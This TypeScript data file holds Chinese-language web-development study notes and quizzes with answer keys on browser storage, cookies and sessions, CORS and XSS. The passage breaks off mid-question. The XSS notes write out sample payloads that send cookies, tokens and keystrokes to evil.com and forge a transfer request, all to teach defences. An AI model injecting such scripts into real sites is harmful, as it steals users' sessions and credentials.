import type { NetworkEntry } from './network-topics-types'

export const part2Topics: NetworkEntry[] = [
  // ─── 瀏覽器儲存 ────────────────────────────────────────────────────────────
  {
    slug: 'browser-storage',
    title: 'Cookie / localStorage / sessionStorage',
    description: '比較三種瀏覽器儲存機制的差異、容量限制、有效期與使用場景',
    subCategory: '瀏覽器儲存',
    difficulty: 'easy',
    notes: {
      sections: [
        {
          heading: '三種儲存機制比較表',
          content: `| 特性 | Cookie | localStorage | sessionStorage |
|------|--------|--------------|----------------|
| 容量限制 | ~4 KB | ~5–10 MB | ~5–10 MB |
| 有效期 | 可設定過期時間 | 永久（手動清除） | 頁籤關閉即消失 |
| 隨請求發送 | 是（自動帶在 Header） | 否 | 否 |
| 作用域 | 網域 + 路徑 | 同源（協議+網域+端口） | 同源 + 同一頁籤 |
| 可透過 JS 存取 | 視 HttpOnly 而定 | 是 | 是 |
| 伺服器可存取 | 是 | 否 | 否 |`,
        },
        {
          heading: 'Cookie 的特性與設定',
          content: `Cookie 是最早的瀏覽器儲存方案，每次 HTTP 請求都會自動帶上，因此容量設計得很小（約 4 KB）。

\`\`\`js
// 設定 Cookie（瀏覽器端）
document.cookie = "username=Alice; expires=Fri, 31 Dec 2025 23:59:59 GMT; path=/"

// 讀取 Cookie（會取得所有 Cookie 字串）
console.log(document.cookie)  // "username=Alice; theme=dark"

// 伺服器透過 Set-Cookie Header 設定
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

Cookie 的重要屬性：
- **HttpOnly**：禁止 JavaScript 存取，防止 XSS 竊取
- **Secure**：只在 HTTPS 連線下傳送
- **SameSite**：控制跨站請求是否帶 Cookie（Strict/Lax/None）
- **Domain / Path**：控制 Cookie 的作用範圍`,
        },
        {
          heading: 'localStorage 與 sessionStorage',
          content: `\`\`\`js
// localStorage：永久儲存，同源共享
localStorage.setItem('token', 'eyJhbGci...')
const token = localStorage.getItem('token')
localStorage.removeItem('token')
localStorage.clear()  // 清空所有

// sessionStorage：頁籤關閉即消失，只在當前頁籤有效
sessionStorage.setItem('formDraft', JSON.stringify({ name: 'Alice' }))
const draft = JSON.parse(sessionStorage.getItem('formDraft'))

// 兩者 API 完全相同，差別只在有效期與作用域
// 注意：只能儲存字串，物件需要 JSON.stringify/parse
\`\`\`

**頁籤與 sessionStorage 的關係：**
- 同一個網站開兩個頁籤 → 各自獨立的 sessionStorage，互不共享
- 同一頁籤內導航（SPA 路由切換）→ sessionStorage 保留`,
        },
        {
          heading: 'IndexedDB 補充說明',
          content: `IndexedDB 是更強大的瀏覽器儲存方案，適合需要儲存大量結構化資料的場景：

| 特性 | localStorage | IndexedDB |
|------|-------------|-----------|
| 容量 | ~5–10 MB | 硬碟空間的 50%（可達數百 MB 甚至 GB） |
| 資料型別 | 只能存字串 | 可存物件、Blob、ArrayBuffer |
| 查詢 | 只能靠 key | 支援索引查詢 |
| 操作方式 | 同步 | 非同步（Promise/Event-based） |
| 使用場景 | 簡單設定值 | 離線應用、大型快取、PWA |

\`\`\`js
// IndexedDB 基本使用（簡化版）
const request = indexedDB.open('myDB', 1)
request.onsuccess = (e) => {
  const db = e.target.result
  const tx = db.transaction('users', 'readwrite')
  tx.objectStore('users').add({ id: 1, name: 'Alice' })
}
\`\`\``,
        },
        {
          heading: '各場景適用的儲存方案',
          content: `| 場景 | 建議方案 | 原因 |
|------|----------|------|
| 登入 Session ID | Cookie（HttpOnly） | 防止 XSS；自動帶上請求 |
| JWT Token | localStorage | 容量夠；需要手動帶入 Header |
| 表單暫存草稿 | sessionStorage | 關閉頁籤自動清除，不留殘留 |
| 使用者偏好設定 | localStorage | 需要永久保留 |
| 大型離線資料 | IndexedDB | 容量大、支援結構化查詢 |`,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: '以下關於 Cookie、localStorage、sessionStorage 容量限制，何者正確？',
        options: [
          'Cookie ~4 KB；localStorage ~5–10 MB；sessionStorage ~100 MB',
          'Cookie ~4 KB；localStorage ~5–10 MB；sessionStorage ~5–10 MB',
          '三者容量相同，都是 5 MB',
          'Cookie ~10 MB；localStorage ~4 KB；sessionStorage ~4 KB',
        ],
        answer: 1,
        explanation: 'Cookie 容量約 4 KB，設計得很小是因為每次 HTTP 請求都要帶上；localStorage 和 sessionStorage 容量相近，約 5–10 MB（各瀏覽器略有不同）。需要更大儲存空間應使用 IndexedDB。',
      },
      {
        id: 2,
        question: '哪一種儲存方式的資料會在每次 HTTP 請求時自動帶到伺服器？',
        options: [
          'localStorage',
          'sessionStorage',
          'Cookie',
          '三者都會',
        ],
        answer: 2,
        explanation: 'Cookie 會在每次 HTTP 請求時自動附加在請求 Header 中（Cookie: xxx）帶給伺服器。localStorage 和 sessionStorage 的資料只存在瀏覽器，不會自動隨請求發送，若需要傳送必須由 JavaScript 手動放到 Header 或請求 body。',
      },
      {
        id: 3,
        question: '使用者在同一個網站開了兩個頁籤，以下何者正確？',
        options: [
          '兩個頁籤共享 localStorage 和 sessionStorage',
          '兩個頁籤共享 localStorage，各自獨立的 sessionStorage',
          '兩個頁籤各自獨立的 localStorage 和 sessionStorage',
          '兩個頁籤共享 sessionStorage，各自獨立的 localStorage',
        ],
        answer: 1,
        explanation: 'localStorage 作用域是同源（同協議+網域+端口），同一網站的所有頁籤共享同一個 localStorage。sessionStorage 作用域是「同源 + 同一頁籤」，兩個頁籤各自擁有獨立的 sessionStorage，互不影響。',
      },
      {
        id: 4,
        question: 'sessionStorage 的資料何時會消失？',
        options: [
          '瀏覽器關閉時',
          '頁籤（Tab）關閉時',
          'Cookie 設定的過期時間到達時',
          '使用者登出時',
        ],
        answer: 1,
        explanation: 'sessionStorage 的資料在「頁籤關閉」時消失，而非整個瀏覽器關閉。如果使用者在同一頁籤中進行 SPA 路由切換，sessionStorage 資料仍然保留。瀏覽器關閉後重新開啟，新的頁籤有全新的空 sessionStorage。',
      },
      {
        id: 5,
        question: '以下哪個儲存方案最適合存放敏感的 Session ID，以防止 XSS 攻擊竊取？',
        options: [
          'localStorage，因為容量大',
          'sessionStorage，因為頁籤關閉自動清除',
          'Cookie 搭配 HttpOnly 屬性',
          'IndexedDB，因為安全性最高',
        ],
        answer: 2,
        explanation: 'HttpOnly Cookie 是儲存 Session ID 的最佳實踐。HttpOnly 屬性使 JavaScript 無法讀取該 Cookie（document.cookie 看不到），即使網站遭受 XSS 攻擊，惡意腳本也無法竊取 Session ID。localStorage 和 sessionStorage 都可被 JavaScript 讀取，存在 XSS 風險。',
      },
      {
        id: 6,
        question: '以下程式碼有什麼問題？\n\nlocalStorage.setItem("user", { name: "Alice", age: 30 })',
        options: [
          '沒有問題，localStorage 可以直接儲存物件',
          '物件會被轉成 "[object Object]" 字串，無法正確還原',
          '會拋出 TypeError，localStorage 不接受物件',
          '物件會自動被 JSON 序列化',
        ],
        answer: 1,
        explanation: 'localStorage 只能儲存字串。直接傳入物件時，JavaScript 會呼叫物件的 toString()，結果是 "[object Object]"，導致資料遺失。正確做法是先 JSON.stringify：localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 30 }))，讀取時再 JSON.parse。',
      },
      {
        id: 7,
        question: '何時應該選用 IndexedDB 而非 localStorage？',
        options: [
          '需要儲存少量字串設定值時',
          '需要在關閉頁籤後保留資料時',
          '需要儲存大型二進位檔案（如圖片）或複雜結構化資料時',
          '需要資料隨 HTTP 請求自動發送時',
        ],
        answer: 2,
        explanation: 'IndexedDB 適合儲存大量結構化資料、二進位資料（Blob、ArrayBuffer）、以及需要索引查詢的場景，容量可達數百 MB 甚至 GB。localStorage 容量只有 5–10 MB 且只能存字串，適合簡單的設定值。需要資料隨請求發送應使用 Cookie，不是 IndexedDB。',
      },
    ],
    keyPoints: [
      'Cookie 容量約 4 KB，每次 HTTP 請求自動帶上；localStorage / sessionStorage 約 5–10 MB，不自動發送給伺服器。',
      'sessionStorage 在頁籤關閉時消失；localStorage 永久保留；Cookie 可設定過期時間。',
      '同一網站的多個頁籤共享 localStorage，但各有獨立的 sessionStorage。',
      '儲存敏感 Session ID 應使用 HttpOnly Cookie，防止 XSS 腳本竊取。',
      'localStorage 只能儲存字串，儲存物件必須搭配 JSON.stringify / JSON.parse。',
      '需要大量結構化資料或離線應用，應使用 IndexedDB，容量遠超 localStorage。',
    ],
  },

  // ─── 瀏覽器儲存 ────────────────────────────────────────────────────────────
  {
    slug: 'cookie-vs-session',
    title: 'Cookie vs Session',
    description: '了解 Cookie 儲存在客戶端與 Session 儲存在伺服器端的差異與搭配使用方式',
    subCategory: '瀏覽器儲存',
    difficulty: 'easy',
    notes: {
      sections: [
        {
          heading: 'Cookie 與 Session 的核心差異',
          content: `| 特性 | Cookie | Session |
|------|--------|---------|
| 儲存位置 | 客戶端（瀏覽器） | 伺服器端（記憶體/資料庫） |
| 容量 | ~4 KB | 理論上無限制（受伺服器資源限制） |
| 安全性 | 較低（存在客戶端，可被竄改） | 較高（資料在伺服器，客戶端只有 ID） |
| 有效期 | 可設定（或關閉瀏覽器消失） | 通常由伺服器設定逾時時間 |
| 擴展性 | 不依賴伺服器狀態 | 有狀態（Stateful），分散式部署需額外處理 |`,
        },
        {
          heading: 'Cookie 與 Session 搭配運作流程',
          content: `Session 並非獨立於 Cookie 之外，實際上 Session ID 通常就是透過 Cookie 傳遞的：

\`\`\`
1. 使用者登入 → 伺服器建立 Session，生成 Session ID（如 "abc123"）
2. 伺服器回應：Set-Cookie: sessionId=abc123; HttpOnly; Secure
3. 瀏覽器儲存此 Cookie
4. 後續每次請求：Cookie: sessionId=abc123
5. 伺服器用 Session ID 查詢對應的 Session 資料（使用者資訊等）
\`\`\`

**重點：** 真正的使用者資料（姓名、權限等）存在伺服器的 Session 中，客戶端只有一個隨機的 Session ID。即使攻擊者拿到 Cookie，也只拿到 ID，無法直接讀取資料。`,
        },
        {
          heading: 'HttpOnly 與 Secure 屬性',
          content: `\`\`\`
// 伺服器設定安全 Cookie 的範例（Node.js / Express）
res.cookie('sessionId', sessionId, {
  httpOnly: true,   // JavaScript 無法存取（防 XSS）
  secure: true,     // 只在 HTTPS 傳送
  sameSite: 'Strict', // 只在同站請求帶上（防 CSRF）
  maxAge: 3600000,  // 1 小時後過期（毫秒）
})
\`\`\`

**HttpOnly 的效果：**
- 設定後，\`document.cookie\` 看不到該 Cookie
- 惡意 XSS 腳本無法透過 JS 竊取 Session ID
- 但 Cookie 仍會正常隨 HTTP 請求發送給伺服器

**Secure 的效果：**
- Cookie 只在 HTTPS 連線下傳送
- 防止中間人攻擊（Man-in-the-Middle）在明文 HTTP 中竊取`,
        },
        {
          heading: 'SameSite 屬性說明',
          content: `SameSite 屬性控制跨站請求是否帶上 Cookie，是防禦 CSRF 的重要手段：

| SameSite 值 | 行為 |
|-------------|------|
| \`Strict\` | 只有同站請求才帶 Cookie，跨站完全不帶（包括從其他網站點連結） |
| \`Lax\`（預設） | 跨站的 GET 請求（如點連結）帶 Cookie；跨站 POST/XHR 不帶 |
| \`None\` | 所有跨站請求都帶 Cookie（必須搭配 \`Secure\`） |

\`\`\`
// 第三方嵌入（如廣告追蹤）需要 SameSite=None; Secure
Set-Cookie: tracking=xyz; SameSite=None; Secure
\`\`\``,
        },
        {
          heading: 'Session 的伺服器端管理與擴展性問題',
          content: `**單台伺服器：**
Session 通常存在記憶體（如 Node.js 的 express-session 預設），重啟伺服器 Session 消失。

**多台伺服器（分散式）：**
需要共享 Session 存儲，常見方案：
- **Redis**：最常見，高效的 in-memory 資料庫
- **資料庫**：持久化但速度較慢
- **Sticky Session**：同一用戶的請求都導到同一台伺服器（有單點故障風險）

**JWT 替代方案：**
現代 API 常使用 JWT（JSON Web Token）替代 Session，JWT 是無狀態的（Stateless），不需要伺服器存儲，天然支援分散式架構，但缺點是登出後無法即時失效。`,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'Cookie 和 Session 的儲存位置分別在哪裡？',
        options: [
          'Cookie 在伺服器端；Session 在客戶端',
          'Cookie 在客戶端（瀏覽器）；Session 在伺服器端',
          '兩者都在客戶端',
          '兩者都在伺服器端',
        ],
        answer: 1,
        explanation: 'Cookie 儲存在客戶端（瀏覽器），每次 HTTP 請求都會自動帶上。Session 儲存在伺服器端（記憶體、Redis 或資料庫），客戶端只持有一個 Session ID，通常透過 Cookie 傳遞。',
      },
      {
        id: 2,
        question: '設定 HttpOnly 屬性的 Cookie 有什麼特性？',
        options: [
          '只能在 HTTP 連線下傳送，HTTPS 無效',
          'JavaScript（如 document.cookie）無法讀取該 Cookie',
          'Cookie 只保留一個 HTTP 請求的時間',
          'Cookie 的容量限制從 4 KB 增加到 10 KB',
        ],
        answer: 1,
        explanation: 'HttpOnly 屬性使 Cookie 無法被 JavaScript 存取。設定後，document.cookie 看不到此 Cookie，XSS 攻擊腳本也無法竊取它。但 Cookie 仍會正常隨 HTTP 請求發送給伺服器。注意：Secure 屬性才是限制只在 HTTPS 傳送。',
      },
      {
        id: 3,
        question: '使用者登入後，Session 機制的正確運作流程是？',
        options: [
          '使用者資料直接存在 Cookie 中，每次請求都帶上所有資料',
          '伺服器建立 Session 並生成 Session ID，Session ID 透過 Cookie 傳給客戶端，後續請求憑 Session ID 查詢伺服器上的資料',
          'Session 資料透過 URL 參數傳遞，每個請求 URL 都帶上 Session ID',
          '客戶端將 Session 資料存在 localStorage，每次 fetch 時手動帶上',
        ],
        answer: 1,
        explanation: 'Session 機制的標準流程：登入後伺服器生成唯一的 Session ID，透過 Set-Cookie Header 傳給瀏覽器。後續請求瀏覽器自動帶上此 Cookie，伺服器用 Session ID 查詢對應的 Session 資料（使用者資訊、權限等）。真正的敏感資料留在伺服器，客戶端只有 ID。',
      },
      {
        id: 4,
        question: 'Session 機制在多台伺服器（分散式）部署時，主要面臨什麼問題？',
        options: [
          'Session ID 長度不夠，容易碰撞',
          'Session 若存在單台伺服器記憶體，其他伺服器無法讀取同一個使用者的 Session',
          'Cookie 無法在多個網域間共享 Session ID',
          'Session 資料太大，超過 Cookie 4 KB 的限制',
        ],
        answer: 1,
        explanation: '若 Session 存在單台伺服器的記憶體，當負載均衡器將同一用戶的不同請求導向不同伺服器時，其他伺服器找不到對應的 Session，導致驗證失敗。解決方案是使用共享 Session 存儲（如 Redis）讓所有伺服器都能存取，或使用無狀態的 JWT 替代方案。',
      },
      {
        id: 5,
        question: 'SameSite=Strict 的 Cookie 在什麼情況下不會被帶上請求？',
        options: [
          '只有 HTTPS 連線時不帶',
          '所有第三方（跨站）請求都不帶，包括從其他網站點連結到此網站',
          '只有 POST 請求不帶，GET 請求仍會帶',
          '只有 API 請求不帶，頁面瀏覽仍會帶',
        ],
        answer: 1,
        explanation: 'SameSite=Strict 是最嚴格的設定，任何跨站請求都不會帶上 Cookie，包括從其他網站點連結進來的 GET 請求。這提供了最強的 CSRF 防護，但可能影響使用者體驗（如點擊外部連結後需重新登入）。SameSite=Lax 則允許跨站 GET 請求帶 Cookie。',
      },
      {
        id: 6,
        question: '與傳統 Session 相比，JWT（JSON Web Token）的主要優勢是？',
        options: [
          'JWT 比 Session ID 更短，節省傳輸頻寬',
          'JWT 是無狀態的，伺服器不需儲存 Token 資訊，天然支援分散式架構',
          'JWT 更安全，無法被竄改或偽造',
          'JWT 可以儲存更多使用者資料',
        ],
        answer: 1,
        explanation: 'JWT 的最大優勢是無狀態（Stateless）。伺服器不需要存儲任何 Token 資訊，驗證時只需用密鑰驗證簽名即可，天然支援多伺服器分散式部署。缺點是 Token 一旦發出，在過期前無法即時失效（需要 Token 黑名單機制才能強制登出）。',
      },
      {
        id: 7,
        question: '以下哪個設定組合最能保護 Session Cookie 的安全性？',
        options: [
          'SameSite=None; Path=/',
          'HttpOnly; Secure; SameSite=Strict',
          'Secure; Domain=.example.com',
          'HttpOnly; SameSite=None',
        ],
        answer: 1,
        explanation: 'HttpOnly 防止 XSS 腳本讀取 Cookie；Secure 確保 Cookie 只在 HTTPS 傳送，防中間人攻擊；SameSite=Strict 防止跨站請求帶上 Cookie，防止 CSRF 攻擊。三者結合是保護 Session Cookie 的最佳實踐。',
      },
    ],
    keyPoints: [
      'Cookie 儲存在客戶端（瀏覽器），Session 儲存在伺服器端；兩者通常搭配使用，Session ID 透過 Cookie 傳遞。',
      'HttpOnly 屬性讓 JavaScript 無法讀取 Cookie，是防止 XSS 竊取 Session ID 的關鍵防護。',
      'Secure 屬性確保 Cookie 只在 HTTPS 連線下傳送，防止明文傳輸被竊聽。',
      'SameSite=Strict 完全阻止跨站請求帶 Cookie；SameSite=Lax（預設）允許跨站 GET 請求帶 Cookie。',
      '多台伺服器分散式部署時，Session 需要共享存儲（如 Redis）；JWT 則是無狀態替代方案。',
      'JWT 優點是無狀態、易於分散式部署；缺點是 Token 發出後難以即時撤銷。',
    ],
  },

  // ─── 安全與跨域 ────────────────────────────────────────────────────────────
  {
    slug: 'cors',
    title: 'CORS 跨域資源共享',
    description: '理解同源政策限制與 CORS 如何透過 HTTP 標頭允許跨域請求',
    subCategory: '安全與跨域',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: '同源政策（Same-Origin Policy）',
          content: `同源政策是瀏覽器的安全機制，限制一個來源的網頁只能存取同源的資源。

**「同源」的定義：協議 + 網域 + 端口三者完全相同**

\`\`\`
基準 URL：https://www.example.com:443/page

https://www.example.com/other    → 同源 ✅（預設 port 443）
http://www.example.com/other     → 不同源 ❌（協議不同：http vs https）
https://api.example.com/data     → 不同源 ❌（子網域不同）
https://www.example.com:8080/api → 不同源 ❌（端口不同）
https://other-site.com/api       → 不同源 ❌（網域不同）
\`\`\`

同源政策限制的是 **JavaScript 的 fetch/XHR 存取跨域回應**，並非阻止請求發出。圖片標籤（\`<img>\`）、樣式表（\`<link>\`）等嵌入式請求則不受限制。`,
        },
        {
          heading: '簡單請求 vs 預檢請求（Preflight）',
          content: `CORS 請求分為兩類：

**簡單請求（Simple Request）**，同時滿足以下條件才算：
- 方法：GET、POST 或 HEAD
- Content-Type：\`text/plain\`、\`multipart/form-data\` 或 \`application/x-www-form-urlencoded\`
- 沒有自訂 Header

**預檢請求（Preflight Request）**，不符合簡單請求條件時觸發：
\`\`\`
觸發情境：
- 使用 PUT、DELETE、PATCH 等方法
- Content-Type: application/json
- 有自訂 Header（如 Authorization）

流程：
1. 瀏覽器先自動發送 OPTIONS 請求詢問伺服器是否允許
2. 伺服器回應允許的方法、Header、來源
3. 瀏覽器確認允許後，才發送實際請求
\`\`\``,
        },
        {
          heading: '重要的 CORS Headers',
          content: `**伺服器回應 Headers（伺服器設定）：**

\`\`\`
Access-Control-Allow-Origin: https://frontend.example.com
# 或 * 表示允許所有來源（不能與 Credentials 同用）

Access-Control-Allow-Methods: GET, POST, PUT, DELETE

Access-Control-Allow-Headers: Content-Type, Authorization

Access-Control-Allow-Credentials: true
# 允許請求帶 Cookie，此時 Allow-Origin 不能為 *

Access-Control-Max-Age: 86400
# Preflight 結果的快取時間（秒），避免每次都 OPTIONS
\`\`\`

**請求 Headers（瀏覽器自動加）：**
\`\`\`
Origin: https://frontend.example.com
Access-Control-Request-Method: POST        # 預檢請求帶
Access-Control-Request-Headers: Authorization  # 預檢請求帶
\`\`\``,
        },
        {
          heading: '前端開發時的跨域解法',
          content: `**開發環境：使用 Dev Server Proxy**

\`\`\`js
// next.config.js 或 vite.config.js
// 將 /api/* 代理到後端伺服器，瀏覽器以為是同源
module.exports = {
  async rewrites() {
    return [{ source: '/api/:path*', destination: 'http://localhost:3001/:path*' }]
  }
}
\`\`\`

**生產環境常見方案：**
1. **後端設定 CORS Header**（最正確）
2. **Reverse Proxy（Nginx）**：前後端放同一個 Origin
3. **JSONP**（舊方案，只支援 GET，已不推薦）

\`\`\`
# Nginx 設定範例
location /api/ {
  add_header Access-Control-Allow-Origin https://frontend.example.com;
  add_header Access-Control-Allow-Methods "GET, POST, OPTIONS";
  proxy_pass http://backend:3000/;
}
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: '「同源（Same-Origin）」的定義是什麼？',
        options: [
          '只要網域相同就算同源',
          '協議、網域、端口三者完全相同才算同源',
          '協議和網域相同就算同源，端口不影響',
          '只要在同一個網域下，子網域也算同源',
        ],
        answer: 1,
        explanation: '同源的定義是「協議（http/https）+ 網域（domain）+ 端口（port）」三者完全相同。只要有任一項不同，就屬於不同源。例如：https://api.example.com 和 https://www.example.com 就是不同源（子網域不同）。',
      },
      {
        id: 2,
        question: '哪些條件會觸發「預檢請求（Preflight/OPTIONS）」？',
        options: [
          '所有跨域請求都會觸發預檢',
          '只有 POST 請求會觸發預檢',
          '使用 PUT/DELETE 方法、Content-Type: application/json，或帶有自訂 Header（如 Authorization）',
          '只有帶 Cookie 的請求才會觸發預檢',
        ],
        answer: 2,
        explanation: '觸發預檢請求（OPTIONS）的條件：使用 GET/POST/HEAD 以外的方法（如 PUT、DELETE、PATCH）；Content-Type 不是 text/plain、multipart/form-data 或 application/x-www-form-urlencoded（例如 application/json）；帶有自訂 Header（如 Authorization）。符合「簡單請求」條件的跨域請求不會觸發預檢。',
      },
      {
        id: 3,
        question: '伺服器回應的 Access-Control-Allow-Origin: * 代表什麼？有什麼限制？',
        options: [
          '允許所有來源，且可以搭配 Access-Control-Allow-Credentials: true',
          '允許所有來源，但不能搭配 Access-Control-Allow-Credentials: true（不能帶 Cookie）',
          '只允許同一個頂級網域下的所有子網域',
          '允許所有來源，且每次請求都不需要預檢',
        ],
        answer: 1,
        explanation: 'Access-Control-Allow-Origin: * 允許任何來源存取，但有一個重要限制：不能同時使用 Access-Control-Allow-Credentials: true。若請求需要帶 Cookie 或 HTTP 認證，伺服器必須指定明確的來源（如 Access-Control-Allow-Origin: https://frontend.example.com），不能使用萬用字元 *。',
      },
      {
        id: 4,
        question: '以下哪個 CORS Header 可以讓瀏覽器快取 Preflight 結果、減少 OPTIONS 請求數量？',
        options: [
          'Access-Control-Allow-Methods',
          'Access-Control-Allow-Origin',
          'Access-Control-Max-Age',
          'Access-Control-Allow-Credentials',
        ],
        answer: 2,
        explanation: 'Access-Control-Max-Age 指定 Preflight 請求結果的快取時間（秒）。例如設定 86400 表示 24 小時內，瀏覽器不需要再次發送 OPTIONS 請求，直接使用快取的許可結果，可減少額外的網路請求。',
      },
      {
        id: 5,
        question: '前端開發時，使用 Dev Server Proxy 解決跨域的原理是什麼？',
        options: [
          '在瀏覽器中繞過同源政策限制',
          '讓瀏覽器以為請求是發到同源，由 Dev Server 在伺服器端轉發給後端',
          '修改後端伺服器的 CORS 設定',
          '使用 JSONP 替代 fetch',
        ],
        answer: 1,
        explanation: 'Dev Server Proxy 的原理：前端將 API 請求發到自己的 Dev Server（如 /api/users），Dev Server 在伺服器端（Node.js）將請求轉發到實際後端（如 http://localhost:3001/users）。瀏覽器看到的是「自己的 Dev Server 回應」，屬於同源，因此不觸發 CORS 限制。同源政策只限制瀏覽器端，伺服器對伺服器的請求沒有此限制。',
      },
      {
        id: 6,
        question: '以下哪個描述正確說明了同源政策的限制範圍？',
        options: [
          '阻止瀏覽器發送任何跨域請求',
          '<img> 標籤載入跨域圖片也受到同源政策限制',
          '限制 JavaScript 透過 fetch/XHR 讀取跨域回應，但不阻止跨域請求發送',
          '同源政策只限制 POST 請求，GET 請求不受限',
        ],
        answer: 2,
        explanation: '同源政策限制的是「JavaScript 讀取跨域請求的回應」，而非阻止請求發出（請求實際上已發送到伺服器）。`<img src="跨域">` 載入圖片、`<script src="跨域">` 載入腳本、`<link>` 載入樣式表等嵌入式請求不受同源政策限制。CORS 機制是讓伺服器表態「允許哪些跨域來源讀取回應」。',
      },
      {
        id: 7,
        question: '跨域 fetch 請求預設是否會帶上 Cookie？如何讓它帶上？',
        options: [
          '預設會帶上 Cookie，無需額外設定',
          '預設不帶 Cookie，需要設定 fetch 的 credentials: "include"，且伺服器必須回應對應 CORS Header',
          '只有 GET 請求預設帶 Cookie，POST 預設不帶',
          'Cookie 永遠不能透過跨域 fetch 傳送',
        ],
        answer: 1,
        explanation: '跨域 fetch 請求預設不帶 Cookie（credentials: "omit"）。若需要帶 Cookie，前端需設定 fetch(url, { credentials: "include" })，同時伺服器必須回應 Access-Control-Allow-Credentials: true 且 Access-Control-Allow-Origin 不能為 *，必須指定明確來源。',
      },
    ],
    keyPoints: [
      '同源 = 協議 + 網域 + 端口三者完全相同，子網域不同也算跨域。',
      '同源政策限制 JS 讀取跨域回應，請求實際上已發送到伺服器；<img>、<script> 嵌入不受限制。',
      'PUT/DELETE、application/json、自訂 Header（如 Authorization）都會觸發 Preflight OPTIONS 請求。',
      'Access-Control-Allow-Origin: * 不能與 Allow-Credentials: true 同時使用。',
      'Access-Control-Max-Age 可快取 Preflight 結果，減少 OPTIONS 請求次數。',
      '前端 Dev Server Proxy 利用「伺服器對伺服器無跨域限制」的原理解決開發時的跨域問題。',
    ],
  },

  // ─── 安全與跨域 ────────────────────────────────────────────────────────────
  {
    slug: 'xss-attack',
    title: 'XSS 跨站腳本攻擊',
    description: '了解 XSS 攻擊的三種類型及如何透過輸入驗證和 CSP 防禦',
    subCategory: '安全與跨域',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: 'XSS 的三種類型',
          content: `XSS（Cross-Site Scripting）是攻擊者將惡意腳本注入到可信任的網頁中執行的攻擊。

**1. Stored XSS（持久型 / 儲存型）**
- 惡意腳本被儲存在伺服器（資料庫）中
- 每次其他使用者瀏覽該頁面都會執行
- 例如：留言板輸入 \`<script>fetch('evil.com?c='+document.cookie)</script>\`

**2. Reflected XSS（反射型）**
- 惡意腳本透過 URL 參數傳遞，伺服器原封不動反射回 HTML
- 需要誘使使用者點擊惡意連結才能觸發
- 例如：\`https://example.com/search?q=<script>alert(1)</script>\`

**3. DOM-based XSS**
- 攻擊完全在客戶端發生，不經過伺服器
- 惡意腳本透過 JavaScript 操作 DOM 插入
- 例如：\`document.innerHTML = location.hash\`（讀取 URL 的 # 後面內容直接插入 DOM）`,
        },
        {
          heading: 'XSS 攻擊可以做什麼',
          content: `\`\`\`js
// 常見的 XSS 攻擊目的：

// 1. 竊取 Cookie（Session 劫持）
<script>
  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie
</script>

// 2. 竊取 localStorage 中的 Token
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
</script>

// 3. 偽造操作（以受害者身份發送請求）
<script>
  fetch('/api/transfer', {
    method: 'POST',
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
  })
</script>

// 4. 鍵盤側錄（竊取密碼）
<script>
  document.addEventListener('keypress', e => {
    fetch('https://evil.com/log?key=' + e.key)
  })
</script>
\`\`\``,
        },
        {
          heading: '防禦方式一：輸出編碼（HTML Encode）',
          content: `**最基本的防禦：永遠不要將未經處理的使用者輸入直接插入 HTML**

\`\`\`js
// 危險：直接插入（XSS 漏洞）
element.innerHTML = userInput

// 安全：用 textContent（純文字，不解析 HTML）
element.textContent = userInput

// 安全：HTML Encode 後再插入（將 < > " ' & 轉成 HTML 實體）
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}
element.innerHTML = escapeHTML(userInput)

// React / Vue 預設會自動 Escape，這是框架的安全設計
// 但使用 dangerouslySetInnerHTML（React）或 v-html（Vue）要特別小心
\`\`\``,
        },
        {
          heading: '防禦方式二：CSP 與 DOMPurify',
          content: `**Content Security Policy（CSP）**
透過 HTTP Header 告訴瀏覽器只執行來自指定來源的腳本：

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
# 'self' 表示只允許同源腳本
# 內聯的 <script> 標籤（inline script）預設被禁止
# 即使 XSS 注入了 <script>，也會被 CSP 阻止執行
\`\`\`

**DOMPurify（Sanitize Library）**
當確實需要允許使用者輸入 HTML 時（如富文字編輯器），使用 DOMPurify 清除惡意標籤：

\`\`\`js
import DOMPurify from 'dompurify'

// 清除惡意內容，保留安全的 HTML 標籤
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean

// DOMPurify 會移除 <script>、on* 屬性（onclick 等）等危險內容
// 保留 <b>、<i>、<a>（href 安全的）等合法標籤
\`\`\`

**HttpOnly Cookie** 也是重要防禦：即使 XSS 成功執行，也無法透過 JS 竊取標記為 HttpOnly 的 Cookie。`,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: '以下哪種 XSS 攻擊是「惡意腳本被儲存在伺服器資料庫，每次使用者瀏覽該頁面都會執行」？',
        options: [
          'Reflected XSS（反射型）',
          'DOM-based XSS',
          'Stored XSS（持久型）',
          'Blind XSS',
        ],
        answer: 2,
        explanation: 'Stored XSS（持久型/儲存型）的特徵是惡意腳本被持久化到伺服器資料庫中。例如攻擊者在留言板輸入含有 `<script>` 的留言，伺服器將其儲存，之後每個瀏覽該留言的使用者都會執行該惡意腳本，危害範圍最大。',
      },
      {
        id: 2,
        question: 'DOM-based XSS 與 Stored/Reflected XSS 的主要差異是？',
        options: [
          'DOM-based XSS 危害更大，會持久儲存在資料庫',
          'DOM-based XSS 完全在客戶端發生，惡意腳本不經過伺服器',
          'DOM-based XSS 只能透過 POST 請求觸發',
          'DOM-based XSS 需要伺服器配合才能執行',
        ],
        answer: 1,
        explanation: 'DOM-based XSS 完全在瀏覽器端發生，攻擊者透過修改 URL（如 location.hash 或查詢參數）來觸發。JavaScript 讀取這些值並直接插入 DOM（如 innerHTML = location.hash），不經過伺服器處理，因此伺服器端的輸入驗證也無法阻止這類攻擊，必須在客戶端也做好輸出編碼。',
      },
      {
        id: 3,
        question: '以下哪行程式碼存在 XSS 漏洞？',
        options: [
          'element.textContent = userInput',
          'element.innerHTML = DOMPurify.sanitize(userInput)',
